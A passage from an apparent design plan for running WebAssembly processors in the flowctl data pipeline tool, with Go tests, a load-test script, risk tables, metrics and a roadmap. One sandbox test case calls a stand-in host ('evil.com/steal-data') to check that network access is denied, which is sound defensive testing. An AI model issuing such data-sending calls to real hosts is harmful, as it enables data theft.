    // Load test WASM module
    wasmBytes := loadTestModule("test_processor.wasm")
    module, err := runtime.LoadModule(ctx, wasmBytes)
    require.NoError(t, err)
    
    // Test basic execution
    input := `{"id": "test", "data": {}}`
    output, err := module.Process([]byte(input))
    require.NoError(t, err)
    require.NotEmpty(t, output)
}
```

#### 2. **Security Boundary Tests**
```go
func TestSecuritySandbox(t *testing.T) {
    tests := []struct {
        name           string
        wasmCode       string
        capabilities   Capabilities
        expectError    bool
        errorContains  string
    }{
        {
            name:     "unauthorized_network_access",
            wasmCode: `http_get("https://evil.com/steal-data")`,
            capabilities: Capabilities{Network: NetworkCapability{Enabled: false}},
            expectError: true,
            errorContains: "network access denied",
        },
        {
            name:     "memory_limit_exceeded",
            wasmCode: `allocate_large_buffer(1_000_000_000)`, // 1GB
            capabilities: DefaultCapabilities(),
            expectError: true,
            errorContains: "memory limit exceeded",
        },
    }
    
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            wasmBytes := compileTestCode(tt.wasmCode)
            processor := NewWasmProcessor(wasmBytes, tt.capabilities)
            
            _, err := processor.Process([]byte(`{}`))
            
            if tt.expectError {
                require.Error(t, err)
                require.Contains(t, err.Error(), tt.errorContains)
            } else {
                require.NoError(t, err)
            }
        })
    }
}
```

### Integration Testing

#### 1. **End-to-End Pipeline Tests**
```go
func TestWasmProcessorInPipeline(t *testing.T) {
    // Create test pipeline with WASM processor
    pipeline := &Pipeline{
        Sources: []Component{
            {ID: "test-source", Type: "mock"},
        },
        Processors: []Component{
            {
                ID:   "wasm-processor",
                Type: "wasm",
                Config: map[string]interface{}{
                    "wasm_file": "test_processor.wasm",
                },
            },
        },
        Sinks: []Component{
            {ID: "test-sink", Type: "mock"},
        },
    }
    
    // Run pipeline
    orchestrator := NewHybridOrchestrator()
    err := orchestrator.RunPipeline(context.Background(), pipeline)
    require.NoError(t, err)
    
    // Send test events
    events := []Event{
        {ID: "1", Data: map[string]interface{}{"value": 100}},
        {ID: "2", Data: map[string]interface{}{"value": 200}},
    }
    
    for _, event := range events {
        orchestrator.SendEvent("test-source", &event)
    }
    
    // Verify processed events
    processedEvents := orchestrator.GetEvents("test-sink")
    require.Len(t, processedEvents, 2)
    
    // Verify processing logic worked
    assert.Equal(t, "processed", processedEvents[0].Metadata["status"])
}
```

#### 2. **Performance Regression Tests**
```go
func TestWasmPerformance(t *testing.T) {
    // Load performance baseline
    baseline := loadPerformanceBaseline("ttp_processor_baseline.json")
    
    // Run WASM processor benchmark
    results := benchmarkWasmProcessor(t, "ttp_processor.wasm", 10000)
    
    // Check performance requirements
    assert.True(t, results.ThroughputEPS >= baseline.ThroughputEPS*0.9, 
        "Throughput regression: got %d, expected >= %d", 
        results.ThroughputEPS, int(baseline.ThroughputEPS*0.9))
    
    assert.True(t, results.LatencyP99 <= baseline.LatencyP99*1.5,
        "Latency regression: got %dms, expected <= %dms",
        results.LatencyP99, int(baseline.LatencyP99*1.5))
    
    assert.True(t, results.MemoryMB <= baseline.MemoryMB*1.2,
        "Memory regression: got %dMB, expected <= %dMB",
        results.MemoryMB, int(baseline.MemoryMB*1.2))
}
```

### Load Testing

#### 1. **Stress Testing**
```bash
#!/bin/bash
# Load test script for WASM processors

echo "Starting WASM processor load test..."

# Test configuration
EVENTS_PER_SECOND=5000
DURATION_MINUTES=30
CONCURRENT_PROCESSORS=10

# Run load test
flowctl load-test \
    --pipeline=test-wasm-pipeline.yaml \
    --events-per-second=$EVENTS_PER_SECOND \
    --duration=${DURATION_MINUTES}m \
    --processors=$CONCURRENT_PROCESSORS \
    --output=load-test-results.json

# Analyze results
flowctl analyze-results load-test-results.json \
    --baseline=performance-baseline.json \
    --fail-on-regression

echo "Load test completed"
```

#### 2. **Memory Leak Detection**
```go
func TestMemoryLeaks(t *testing.T) {
    processor := createWasmProcessor(t, "test_processor.wasm")
    
    // Measure initial memory
    initialMemory := getProcessMemory()
    
    // Process many events
    for i := 0; i < 100000; i++ {
        event := createTestEvent(i)
        _, err := processor.Process(event)
        require.NoError(t, err)
        
        // Force GC every 1000 events
        if i%1000 == 0 {
            runtime.GC()
            runtime.GC() // Double GC to ensure cleanup
        }
    }
    
    // Measure final memory
    runtime.GC()
    runtime.GC()
    finalMemory := getProcessMemory()
    
    // Check for memory leaks (allow 10% growth)
    memoryGrowth := float64(finalMemory-initialMemory) / float64(initialMemory)
    assert.Less(t, memoryGrowth, 0.1, 
        "Potential memory leak detected: %d -> %d bytes (%.2f%% growth)",
        initialMemory, finalMemory, memoryGrowth*100)
}
```

## Risk Assessment

### Technical Risks

#### 1. **Performance Degradation**
- **Risk**: WASM overhead reduces throughput
- **Likelihood**: Medium
- **Impact**: High
- **Mitigation**: 
  - Comprehensive benchmarking
  - Performance budgets in CI
  - Optimization techniques (batching, pooling)
  - Escape hatch to native processors

#### 2. **WASM Runtime Stability**
- **Risk**: Bugs in WASM runtime affect reliability
- **Likelihood**: Low
- **Impact**: High
- **Mitigation**:
  - Use mature runtime (Wazero)
  - Extensive testing
  - Runtime isolation per processor
  - Graceful degradation

#### 3. **Developer Adoption**
- **Risk**: Developers resist WASM complexity
- **Likelihood**: Medium
- **Impact**: Medium
- **Mitigation**:
  - Excellent developer experience
  - Migration tools
  - Clear documentation
  - Gradual rollout

### Security Risks

#### 1. **Sandbox Escape**
- **Risk**: WASM code escapes sandbox
- **Likelihood**: Low
- **Impact**: Critical
- **Mitigation**:
  - Regular security audits
  - Runtime updates
  - Defense in depth
  - Monitoring and alerting

#### 2. **Resource Exhaustion**
- **Risk**: Malicious WASM consumes resources
- **Likelihood**: Medium
- **Impact**: High
- **Mitigation**:
  - Strict resource limits
  - Monitoring and alerting
  - Circuit breakers
  - Tenant isolation

### Business Risks

#### 1. **Development Complexity**
- **Risk**: Increased complexity slows development
- **Likelihood**: Medium
- **Impact**: Medium
- **Mitigation**:
  - Incremental rollout
  - Comprehensive testing
  - Developer training
  - Clear architecture

#### 2. **Competitive Response**
- **Risk**: Competitors copy WASM approach
- **Likelihood**: High
- **Impact**: Low
- **Mitigation**:
  - Focus on execution quality
  - Continuous innovation
  - Ecosystem development
  - Brand building

## Success Metrics

### Technical Metrics

#### Performance Targets
| Metric | Current | WASM Target | Measurement |
|--------|---------|-------------|-------------|
| Startup Time | 200ms | <100ms | Time to first event processed |
| Throughput | 5000 events/sec | >4500 events/sec | Events processed per second |
| Memory Usage | 50MB avg | <40MB avg | Average memory consumption |
| CPU Efficiency | 60% utilization | <55% utilization | CPU usage at target throughput |

#### Reliability Targets
| Metric | Target | Measurement |
|--------|---------|-------------|
| Crash Rate | <0.1% | Processor crashes per 1M events |
| Memory Leaks | 0 | Memory growth over 24h operation |
| Resource Limit Violations | 0 | Sandbox escape attempts |
| Error Rate | <0.01% | Processing errors per event |

### Business Metrics

#### Adoption Targets
| Metric | 3 Month | 6 Month | 12 Month |
|--------|---------|---------|----------|
| WASM Processors Created | 50 | 500 | 2000 |
| Active WASM Users | 10 | 100 | 500 |
| WASM Events Processed | 1M | 100M | 10B |
| Customer Satisfaction | >8.0/10 | >8.5/10 | >9.0/10 |

#### Competitive Metrics
| Metric | Target | Measurement |
|--------|---------|-------------|
| Time to Market | First mover | WASM data pipeline platform |
| Developer NPS | >50 | Net Promoter Score |
| Market Share | 10% | Of WASM-enabled data platforms |
| Revenue Impact | 25% | Increase in enterprise sales |

## Future Roadmap

### Near Term (6 months)
- Complete WASM processor implementation
- Rust and Go SDK availability
- Performance parity with native processors
- Basic security and sandboxing

### Medium Term (12 months)
- Multi-language SDK support
- Advanced security features
- Processor marketplace
- Enterprise multi-tenancy

### Long Term (18+ months)
- AI/ML model inference in WASM
- Edge deployment capabilities
- Real-time collaboration features
- Autonomous pipeline optimization

## Conclusion

The integration of WASM into flowctl represents a significant architectural advancement that addresses key challenges in data pipeline security, portability, and multi-tenancy. The hybrid approach—using WASM for processors while maintaining traditional runtimes for I/O components—provides the optimal balance of security and functionality.

Key success factors:

1. **Incremental Implementation**: Phased rollout minimizes risk
2. **Performance Parity**: WASM must match native performance
3. **Developer Experience**: Easy migration and excellent tooling
4. **Security by Default**: Sandboxing without complexity
5. **Ecosystem Development**: SDKs, marketplace, community

This architecture positions flowctl as the first WASM-native data pipeline platform, creating a significant competitive advantage in the growing edge computing and multi-tenant SaaS markets.

The implementation plan provides a clear path to production deployment within 16 weeks, with measurable milestones and success criteria. Risk mitigation strategies address the primary concerns around performance, security, and developer adoption.

By executing this plan, flowctl will establish itself as the leading platform for secure, portable, and scalable data processing—perfectly positioned for the future of AI-native applications and edge computing workloads.